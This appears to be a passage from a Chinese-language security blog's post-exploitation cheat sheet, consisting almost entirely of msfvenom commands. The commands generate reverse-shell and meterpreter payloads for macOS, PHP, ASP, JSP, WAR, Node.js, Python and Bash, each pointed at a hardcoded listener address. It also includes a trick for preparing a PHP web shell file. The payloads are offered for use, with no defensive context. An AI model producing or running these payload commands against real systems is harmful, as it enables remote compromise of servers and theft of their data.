<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.222.135 LPORT=4567  -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>



<h4 id="WEB常用"><a href="#WEB常用" class="headerlink" title="WEB常用"></a>WEB常用</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h5 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h4 id="各种语言的脚本"><a href="#各种语言的脚本" class="headerlink" title="各种语言的脚本"></a>各种语言的脚本</h4><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一种Linux下使用python反弹一个cmd形式的shell:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">第二种反弹一个meterpreter形式的shell(windows|Linux都可以):</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://mature-sec.com/post/msfvenom使用小结/" target="_blank" rel="noopener">https://mature-sec.com/post/msfvenom%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
</search>
